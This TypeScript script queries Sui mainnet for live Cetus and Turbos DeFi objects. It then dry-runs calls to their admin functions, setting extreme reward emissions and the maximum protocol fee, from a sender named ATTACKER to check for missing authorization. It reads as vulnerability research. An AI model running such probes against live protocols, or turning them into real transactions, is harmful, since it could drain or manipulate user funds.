import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const CETUS_INTEGRATE = "0x996c4d9480708fb8b92aa7acf819fb0497b5ec8e65ba06601cae2fb6db3312c3";
const CETUS_CLMM = "0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb";
const TURBOS_CLMM = "0x91bfbc386a41afcfd9b2533058d7e915a1d3829089cc268ff4333d54d6339ca1";
const ATTACKER = "0x0000000000000000000000000000000000000000000000000000000000001337";

async function testCall(label: string, buildTx: (tx: Transaction) => void) {
  console.log(`\n=== ${label} ===`);
  try {
    const tx = new Transaction();
    buildTx(tx);
    const result = await client.devInspectTransactionBlock({
      sender: ATTACKER,
      transactionBlock: tx,
    });
    const status = result.effects.status;
    console.log(`Status: ${JSON.stringify(status)}`);
    if (result.error) console.log(`Error: ${result.error.slice(0, 400)}`);
  } catch(e: any) {
    const msg = e.message ?? String(e);
    const abortMatch = msg.match(/MoveAbort.*?}, (\d+)\)/);
    const abortCode = abortMatch ? `abort_code=${abortMatch[1]}` : "no_abort";
    console.log(`Threw [${abortCode}]: ${msg.slice(0, 300)}`);
  }
}

async function main() {
  // Find Cetus GlobalConfig and a Pool object
  console.log("Finding Cetus GlobalConfig...");
  const cetusEvents = await client.queryEvents({
    query: { MoveEventModule: { package: CETUS_INTEGRATE, module: "config_script" } },
    limit: 3,
    order: "descending"
  });
  let globalConfigId = "";
  console.log(`Cetus config events: ${cetusEvents.data.length}`);
  for (const e of cetusEvents.data.slice(0, 3)) {
    const pj = e.parsedJson as any ?? {};
    console.log(`  ${e.type.split("::").pop()}: ${JSON.stringify(pj).slice(0, 150)}`);
  }

  // Try to find GlobalConfig from recent txs
  const cetusTxs = await client.queryTransactionBlocks({
    filter: { MoveFunction: { package: CETUS_INTEGRATE, module: "config_script" } },
    options: { showInput: true },
    limit: 3,
    order: "descending"
  });
  
  for (const tx of cetusTxs.data.slice(0, 1)) {
    console.log(`\nCetus config tx: ${tx.digest}`);
    const inp = (tx.transaction?.data?.transaction as any)?.inputs ?? [];
    for (let i = 0; i < inp.length; i++) {
      if (inp[i].type === "object") {
        console.log(`  input[${i}] obj: ${inp[i].objectId}`);
        const obj = await client.getObject({ id: inp[i].objectId, options: { showType: true } });
        console.log(`    type: ${obj.data?.type?.slice(0, 80)}`);
        if (obj.data?.type?.includes("GlobalConfig")) globalConfigId = inp[i].objectId;
      }
    }
  }

  if (!globalConfigId) {
    console.log("\nLooking for GlobalConfig via pool creation events...");
    const poolEvts = await client.queryEvents({
      query: { MoveEventType: `${CETUS_CLMM}::pool::CreatePoolEvent` },
      limit: 2
    });
    for (const e of poolEvts.data) {
      const pj = e.parsedJson as any ?? {};
      if (pj.global_config_id) { globalConfigId = pj.global_config_id; break; }
    }
  }
  console.log(`\nGlobalConfig: ${globalConfigId || "not found"}`);

  // Test Turbos update_reward_emissions
  // First find a Turbos Pool object
  const turbosTxs = await client.queryTransactionBlocks({
    filter: { MoveFunction: { package: TURBOS_CLMM, module: "reward_manager" } },
    options: { showInput: true },
    limit: 3,
    order: "descending"
  });
  
  console.log(`\nTurbos reward_manager txs: ${turbosTxs.data.length}`);
  let turbosPool = "";
  for (const tx of turbosTxs.data.slice(0, 1)) {
    const inp = (tx.transaction?.data?.transaction as any)?.inputs ?? [];
    for (let i = 0; i < inp.length; i++) {
      if (inp[i].type === "object") {
        const obj = await client.getObject({ id: inp[i].objectId, options: { showType: true } });
        const t = obj.data?.type ?? "";
        console.log(`  input[${i}] ${inp[i].objectId.slice(0,20)} => ${t.slice(0, 80)}`);
        if (t.includes("Pool")) turbosPool = inp[i].objectId;
      }
    }
  }

  if (turbosPool) {
    await testCall("turbos::reward_manager::update_reward_emissions (non-auth)", (tx) => {
      tx.moveCall({
        package: TURBOS_CLMM,
        module: "reward_manager",
        function: "update_reward_emissions",
        typeArguments: ["0x2::sui::SUI", "0x2::sui::SUI", "0x2::sui::SUI", "0x2::sui::SUI"],
        arguments: [
          tx.object(turbosPool),
          tx.pure.u64(999999999),  // emissions per second (extreme)
          tx.pure.u128(999999999n),
        ]
      });
    });
  }

  // Test Cetus config_script::update_protocol_fee_rate
  if (globalConfigId) {
    await testCall("cetus::config_script::update_protocol_fee_rate (non-auth)", (tx) => {
      tx.moveCall({
        package: CETUS_INTEGRATE,
        module: "config_script",
        function: "update_protocol_fee_rate",
        arguments: [
          tx.object(globalConfigId),
          tx.pure.u64(10000),  // max fee rate
        ]
      });
    });
  }
}

main().catch(console.error);
